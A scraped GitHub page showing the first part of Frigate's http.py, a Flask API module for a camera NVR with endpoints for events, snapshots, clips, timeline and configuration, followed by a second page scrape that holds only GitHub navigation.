* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

## Files

 5658e5a
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f)
2. /[frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate)
/
# http.py

Copy path Blame  Blame
## Latest commit

## History

[History](/blakeblackshear/frigate/commits/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)1764 lines (1466 loc) · 53.4 KB 5658e5a
## Breadcrumbs

1. [frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f)
2. /[frigate](/blakeblackshear/frigate/tree/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate)
/
# http.py

Top
## File metadata and controls

* Code
* Blame

1764 lines (1466 loc) · 53.4 KB[Raw](https://github.com/blakeblackshear/frigate/raw/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000import base64import copyimport globimport jsonimport loggingimport osimport subprocess as spimport timeimport tracebackfrom datetime import datetime, timedelta, timezonefrom functools import reducefrom pathlib import Pathfrom urllib.parse import unquote
import cv2import numpy as npimport pytzfrom flask import ( Blueprint, Flask, Response, current\_app, jsonify, make\_response, request,)from peewee import DoesNotExist, fn, operatorfrom playhouse.shortcuts import model\_to\_dictfrom playhouse.sqliteq import SqliteQueueDatabasefrom tzlocal import get\_localzone\_name
from frigate.config import FrigateConfigfrom frigate.const import ( CACHE\_DIR, CLIPS\_DIR, CONFIG\_DIR, MAX\_SEGMENT\_DURATION, RECORD\_DIR,)from frigate.events.external import ExternalEventProcessorfrom frigate.models import Event, Recordings, Timelinefrom frigate.object\_processing import TrackedObjectfrom frigate.plus import PlusApifrom frigate.ptz.onvif import OnvifControllerfrom frigate.record.export import PlaybackFactorEnum, RecordingExporterfrom frigate.stats import stats\_snapshotfrom frigate.storage import StorageMaintainerfrom frigate.util.builtin import ( clean\_camera\_user\_pass, get\_tz\_modifiers, update\_yaml\_from\_url,)from frigate.util.services import ffprobe\_stream, restart\_frigate, vainfo\_hwaccelfrom frigate.version import VERSION
logger = logging.getLogger(\_\_name\_\_)
bp = Blueprint("frigate", \_\_name\_\_)
def create\_app( frigate\_config, database: SqliteQueueDatabase, stats\_tracking, detected\_frames\_processor, storage\_maintainer: StorageMaintainer, onvif: OnvifController, external\_processor: ExternalEventProcessor, plus\_api: PlusApi,): app = Flask(\_\_name\_\_)
 @app.before\_request def \_db\_connect(): if database.is\_closed(): database.connect()
 @app.teardown\_request def \_db\_close(exc): if not database.is\_closed(): database.close()
 app.frigate\_config = frigate\_config app.stats\_tracking = stats\_tracking app.detected\_frames\_processor = detected\_frames\_processor app.storage\_maintainer = storage\_maintainer app.onvif = onvif app.external\_processor = external\_processor app.plus\_api = plus\_api app.camera\_error\_image = None app.hwaccel\_errors = []
 app.register\_blueprint(bp)
 return app
@bp.route("/")def is\_healthy(): return "Frigate is running. Alive and healthy!"
@bp.route("/events/summary")def events\_summary(): tz\_name = request.args.get("timezone", default="utc", type=str) hour\_modifier, minute\_modifier = get\_tz\_modifiers(tz\_name) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int)
 clauses = []
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if len(clauses) == 0: clauses.append((True))
 groups = ( Event.select( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ).alias("day"), Event.zones, fn.COUNT(Event.id).alias("count"), ) .where(reduce(operator.and\_, clauses)) .group\_by( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ), Event.zones, ) )
 return jsonify([e for e in groups.dicts()])
@bp.route("/events/<id>", methods=("GET",))def event(id): try: return model\_to\_dict(Event.get(Event.id == id)) except DoesNotExist: return "Event not found", 404
@bp.route("/events/<id>/retain", methods=("POST",))def set\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = True event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " retained"}), 200 )
@bp.route("/events/<id>/plus", methods=("POST",))def send\_to\_plus(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 include\_annotation = ( request.json.get("include\_annotation") if request.is\_json else None )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: include\_annotation = None
 if event.end\_time is None: logger.error(f"Unable to load clean png for in-progress event: {event.id}") return make\_response( jsonify( { "success": False, "message": "Unable to load clean png for in-progress event", } ), 400, )
 if event.plus\_id: message = "Already submitted to plus" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 # load clean.png try: filename = f"{event.camera}-{event.id}-clean.png" image = cv2.imread(os.path.join(CLIPS\_DIR, filename)) except Exception: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 if image is None or image.size == 0: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 try: plus\_id = current\_app.plus\_api.upload\_image(image, event.camera) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 # store image id in the database event.plus\_id = plus\_id event.save()
 if include\_annotation is not None: box = event.data["box"]
 try: current\_app.plus\_api.add\_annotation( event.plus\_id, box, event.label, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 return make\_response(jsonify({"success": True, "plus\_id": plus\_id}), 200)
@bp.route("/events/<id>/false\_positive", methods=("PUT",))def false\_positive(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: message = "Events prior to 0.13 cannot be submitted as false positives" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if event.false\_positive: message = "False positive already submitted to Frigate+" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if not event.plus\_id: plus\_response = send\_to\_plus(id) if plus\_response.status\_code != 200: return plus\_response # need to refetch the event now that it has a plus\_id event = Event.get(Event.id == id)
 region = event.data["region"] box = event.data["box"]
 # provide top score if score is unavailable score = ( (event.data["top\_score"] if event.data["top\_score"] else event.top\_score) if event.data["score"] is None else event.data["score"] )
 try: current\_app.plus\_api.add\_false\_positive( event.plus\_id, region, box, score, event.label, event.model\_hash, event.model\_type, event.detector\_type, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 event.false\_positive = True event.save()
 return make\_response(jsonify({"success": True, "plus\_id": event.plus\_id}), 200)
@bp.route("/events/<id>/retain", methods=("DELETE",))def delete\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = False event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " un-retained"}), 200 )
@bp.route("/events/<id>/sub\_label", methods=("POST",))def set\_sub\_label(id): try: event: Event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {} new\_sub\_label = json.get("subLabel") new\_score = json.get("subLabelScore")
 if new\_sub\_label and len(new\_sub\_label) > 100: return make\_response( jsonify( { "success": False, "message": new\_sub\_label + " exceeds the 100 character limit for sub\_label", } ), 400, )
 if new\_score is not None and (new\_score > 1.0 or new\_score < 0): return make\_response( jsonify( { "success": False, "message": new\_score + " does not fit within the expected bounds 0 <= score <= 1.0", } ), 400, )
 if not event.end\_time: tracked\_obj: TrackedObject = ( current\_app.detected\_frames\_processor.camera\_states[ event.camera ].tracked\_objects.get(event.id) )
 if tracked\_obj: tracked\_obj.obj\_data["sub\_label"] = (new\_sub\_label, new\_score)
 event.sub\_label = new\_sub\_label
 if new\_score: data = event.data data["sub\_label\_score"] = new\_score event.data = data
 event.save() return make\_response( jsonify( { "success": True, "message": "Event " + id + " sub label set to " + new\_sub\_label, } ), 200, )
@bp.route("/labels")def get\_labels(): camera = request.args.get("camera", type=str, default="")
 try: if camera: events = Event.select(Event.label).where(Event.camera == camera).distinct() else: events = Event.select(Event.label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get labels: {e}"}), 404 )
 labels = sorted([e.label for e in events]) return jsonify(labels)
@bp.route("/sub\_labels")def get\_sub\_labels(): split\_joined = request.args.get("split\_joined", type=int)
 try: events = Event.select(Event.sub\_label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get sub\_labels: {e}"}), 404, )
 sub\_labels = [e.sub\_label for e in events]
 if None in sub\_labels: sub\_labels.remove(None)
 if split\_joined: original\_labels = sub\_labels.copy()
 for label in original\_labels: if "," in label: sub\_labels.remove(label) parts = label.split(",")
 for part in parts: if part.strip() not in sub\_labels: sub\_labels.append(part.strip())
 sub\_labels.sort() return jsonify(sub\_labels)
@bp.route("/events/<id>", methods=("DELETE",))def delete\_event(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 media\_name = f"{event.camera}-{event.id}" if event.has\_snapshot: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.jpg") media.unlink(missing\_ok=True) media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}-clean.png") media.unlink(missing\_ok=True) if event.has\_clip: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.mp4") media.unlink(missing\_ok=True)
 event.delete\_instance() return make\_response( jsonify({"success": True, "message": "Event " + id + " deleted"}), 200 )
@bp.route("/events/<id>/thumbnail.jpg")def event\_thumbnail(id, max\_cache\_age=2592000): format = request.args.get("format", "ios") thumbnail\_bytes = None event\_complete = False try: event = Event.get(Event.id == id) if event.end\_time is not None: event\_complete = True thumbnail\_bytes = base64.b64decode(event.thumbnail) except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: thumbnail\_bytes = tracked\_obj.get\_thumbnail() except Exception: return "Event not found", 404
 if thumbnail\_bytes is None: return "Event not found", 404
 # android notifications prefer a 2:1 ratio if format == "android": jpg\_as\_np = np.frombuffer(thumbnail\_bytes, dtype=np.uint8) img = cv2.imdecode(jpg\_as\_np, flags=1) thumbnail = cv2.copyMakeBorder( img, 0, 0, int(img.shape[1] \* 0.5), int(img.shape[1] \* 0.5), cv2.BORDER\_CONSTANT, (0, 0, 0), ) ret, jpg = cv2.imencode(".jpg", thumbnail, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70]) thumbnail\_bytes = jpg.tobytes()
 response = make\_response(thumbnail\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = f"private, max-age={max\_cache\_age}" else: response.headers["Cache-Control"] = "no-store" return response
@bp.route("/timeline")def timeline(): camera = request.args.get("camera", "all") source\_id = request.args.get("source\_id", type=str) limit = request.args.get("limit", 100)
 clauses = []
 selected\_columns = [ Timeline.timestamp, Timeline.camera, Timeline.source, Timeline.source\_id, Timeline.class\_type, Timeline.data, ]
 if camera != "all": clauses.append((Timeline.camera == camera))
 if source\_id: clauses.append((Timeline.source\_id == source\_id))
 if len(clauses) == 0: clauses.append((True))
 timeline = ( Timeline.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Timeline.timestamp.asc()) .limit(limit) )
 return jsonify([model\_to\_dict(t) for t in timeline])
@bp.route("/<camera\_name>/<label>/best.jpg")@bp.route("/<camera\_name>/<label>/thumbnail.jpg")def label\_thumbnail(camera\_name, label): label = unquote(label) event\_query = Event.select(fn.MAX(Event.id)).where(Event.camera == camera\_name) if label != "any": event\_query = event\_query.where(Event.label == label)
 try: event = event\_query.scalar()
 return event\_thumbnail(event, 60) except DoesNotExist: frame = np.zeros((175, 175, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" response.headers["Cache-Control"] = "no-store" return response
@bp.route("/events/<id>/snapshot.jpg")def event\_snapshot(id): download = request.args.get("download", type=bool) event\_complete = False jpg\_bytes = None try: event = Event.get(Event.id == id, Event.end\_time != None) event\_complete = True if not event.has\_snapshot: return "Snapshot not available", 404 # read snapshot from disk with open( os.path.join(CLIPS\_DIR, f"{event.camera}-{id}.jpg"), "rb" ) as image\_file: jpg\_bytes = image\_file.read() except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: jpg\_bytes = tracked\_obj.get\_jpg\_bytes( timestamp=request.args.get("timestamp", type=int), bounding\_box=request.args.get("bbox", type=int), crop=request.args.get("crop", type=int), height=request.args.get("h", type=int), quality=request.args.get("quality", default=70, type=int), ) except Exception: return "Event not found", 404 except Exception: return "Event not found", 404
 if jpg\_bytes is None: return "Event not found", 404
 response = make\_response(jpg\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = "private, max-age=31536000" else: response.headers["Cache-Control"] = "no-store" if download: response.headers[ "Content-Disposition" ] = f"attachment; filename=snapshot-{id}.jpg" return response
@bp.route("/<camera\_name>/<label>/snapshot.jpg")def label\_snapshot(camera\_name, label): label = unquote(label) if label == "any": event\_query = ( Event.select() .where(Event.camera == camera\_name) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) ) else: event\_query = ( Event.select() .where(Event.camera == camera\_name) .where(Event.label == label) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) )
 try: event = event\_query.get() return event\_snapshot(event.id) except DoesNotExist: frame = np.zeros((720, 1280, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" return response
@bp.route("/events/<id>/clip.mp4")def event\_clip(id): download = request.args.get("download", type=bool)
 try: event: Event = Event.get(Event.id == id) except DoesNotExist: return "Event not found.", 404
 if not event.has\_clip: return "Clip not available", 404
 file\_name = f"{event.camera}-{id}.mp4" clip\_path = os.path.join(CLIPS\_DIR, file\_name)
 if not os.path.isfile(clip\_path): end\_ts = ( datetime.now().timestamp() if event.end\_time is None else event.end\_time ) return recording\_clip(event.camera, event.start\_time, end\_ts)
 response = make\_response() response.headers["Content-Description"] = "File Transfer" response.headers["Cache-Control"] = "no-cache" response.headers["Content-Type"] = "video/mp4" if download: response.headers["Content-Disposition"] = "attachment; filename=%s" % file\_name response.headers["Content-Length"] = os.path.getsize(clip\_path) response.headers[ "X-Accel-Redirect" ] = f"/clips/{file\_name}" # nginx: http://wiki.nginx.org/NginxXSendfile
 return response
@bp.route("/events")def events(): camera = request.args.get("camera", "all") cameras = request.args.get("cameras", "all")
 # handle old camera arg if cameras == "all" and camera != "all": cameras = camera
 label = unquote(request.args.get("label", "all")) labels = request.args.get("labels", "all")
 # handle old label arg if labels == "all" and label != "all": labels = label
 sub\_label = request.args.get("sub\_label", "all") sub\_labels = request.args.get("sub\_labels", "all")
 # handle old sub\_label arg if sub\_labels == "all" and sub\_label != "all": sub\_labels = sub\_label
 zone = request.args.get("zone", "all") zones = request.args.get("zones", "all")
 # handle old label arg if zones == "all" and zone != "all": zones = zone
 limit = request.args.get("limit", 100) after = request.args.get("after", type=float) before = request.args.get("before", type=float) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int) in\_progress = request.args.get("in\_progress", type=int) include\_thumbnails = request.args.get("include\_thumbnails", default=1, type=int) favorites = request.args.get("favorites", type=int)
 clauses = [] excluded\_fields = []
 selected\_columns = [ Event.id, Event.camera, Event.label, Event.zones, Event.start\_time, Event.end\_time, Event.has\_clip, Event.has\_snapshot, Event.plus\_id, Event.retain\_indefinitely, Event.sub\_label, Event.top\_score, Event.false\_positive, Event.box, Event.data, ]
 if camera != "all": clauses.append((Event.camera == camera))
 if cameras != "all": camera\_list = cameras.split(",") clauses.append((Event.camera << camera\_list))
 if labels != "all": label\_list = labels.split(",") clauses.append((Event.label << label\_list))
 if sub\_labels != "all": # use matching so joined sub labels are included # for example a sub label 'bob' would get events # with sub labels 'bob' and 'bob, john' sub\_label\_clauses = [] filtered\_sub\_labels = sub\_labels.split(",")
 if "None" in filtered\_sub\_labels: filtered\_sub\_labels.remove("None") sub\_label\_clauses.append((Event.sub\_label.is\_null()))
 for label in filtered\_sub\_labels: sub\_label\_clauses.append( (Event.sub\_label.cast("text") == label) ) # include exact matches
 # include this label when part of a list sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*{label},\*")) sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*, {label}\*"))
 sub\_label\_clause = reduce(operator.or\_, sub\_label\_clauses) clauses.append((sub\_label\_clause))
 if zones != "all": # use matching so events with multiple zones # still match on a search where any zone matches zone\_clauses = [] filtered\_zones = zones.split(",")
 if "None" in filtered\_zones: filtered\_zones.remove("None") zone\_clauses.append((Event.zones.length() == 0))
 for zone in filtered\_zones: zone\_clauses.append((Event.zones.cast("text") % f'\*"{zone}"\*'))
 zone\_clause = reduce(operator.or\_, zone\_clauses) clauses.append((zone\_clause))
 if after: clauses.append((Event.start\_time > after))
 if before: clauses.append((Event.start\_time < before))
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if in\_progress is not None: clauses.append((Event.end\_time.is\_null(in\_progress)))
 if not include\_thumbnails: excluded\_fields.append(Event.thumbnail) else: selected\_columns.append(Event.thumbnail)
 if favorites: clauses.append((Event.retain\_indefinitely == favorites))
 if len(clauses) == 0: clauses.append((True))
 events = ( Event.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Event.start\_time.desc()) .limit(limit) )
 return jsonify([model\_to\_dict(e, exclude=excluded\_fields) for e in events])
@bp.route("/events/<camera\_name>/<label>/create", methods=["POST"])def create\_event(camera\_name, label): if not camera\_name or not current\_app.frigate\_config.cameras.get(camera\_name): return make\_response( jsonify( {"success": False, "message": f"{camera\_name} is not a valid camera."} ), 404, )
 if not label: return make\_response( jsonify({"success": False, "message": f"{label} must be set."}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {}
 try: frame = current\_app.detected\_frames\_processor.get\_current\_frame(camera\_name)
 event\_id = current\_app.external\_processor.create\_manual\_event( camera\_name, label, json.get("source\_type", "api"), json.get("sub\_label", None), json.get("score", 0), json.get("duration", 30), json.get("include\_recording", True), json.get("draw", {}), frame, ) except Exception as e: return make\_response( jsonify({"success": False, "message": f"An unknown error occurred: {e}"}), 500, )
 return make\_response( jsonify( { "success": True, "message": "Successfully created event.", "event\_id": event\_id, } ), 200, )
@bp.route("/events/<event\_id>/end", methods=["PUT"])def end\_event(event\_id): json: dict[str, any] = request.get\_json(silent=True) or {}
 try: end\_time = json.get("end\_time", datetime.now().timestamp()) current\_app.external\_processor.finish\_manual\_event(event\_id, end\_time) except Exception: return make\_response( jsonify( {"success": False, "message": f"{event\_id} must be set and valid."} ), 404, )
 return make\_response( jsonify({"success": True, "message": "Event successfully ended."}), 200 )
@bp.route("/config")def config(): config = current\_app.frigate\_config.dict()
 for camera\_name, camera in current\_app.frigate\_config.cameras.items(): camera\_dict = config["cameras"][camera\_name]
 # clean paths for input in camera\_dict.get("ffmpeg", {}).get("inputs", []): input["path"] = clean\_camera\_user\_pass(input["path"])
 # add clean ffmpeg\_cmds camera\_dict["ffmpeg\_cmds"] = copy.deepcopy(camera.ffmpeg\_cmds) for cmd in camera\_dict["ffmpeg\_cmds"]: cmd["cmd"] = clean\_camera\_user\_pass(" ".join(cmd["cmd"]))
 config["plus"] = {"enabled": current\_app.plus\_api.is\_active()}
 for detector, detector\_config in config["detectors"].items(): detector\_config["model"][ "labelmap" ] = current\_app.frigate\_config.model.merged\_labelmap
 return jsonify(config)
@bp.route("/config/raw")def config\_raw(): config\_file = os.environ.get("CONFIG\_FILE", "/config/config.yml")
 # Check if we can use .yaml instead of .yml config\_file\_yaml = config\_file.replace(".yml", ".yaml")
 if os.path.isfile(config\_file\_yaml): config\_file = config\_file\_yaml
 if not os.path.isfile(config\_file): return "Could not find file", 410
 with open(config\_file, "r") as f: raw\_config = f.read() f.close()
 return raw\_config, 200
@bp.route("/config/save", methods=["POST"])def config\_save(): save\_option = request.args.get("save\_option")[View remainder of file in raw view](https://github.com/blakeblackshear/frigate/raw/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7c2c7372_20250114_215958.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Futil%2Fbuiltin.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Futil%2Fbuiltin.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


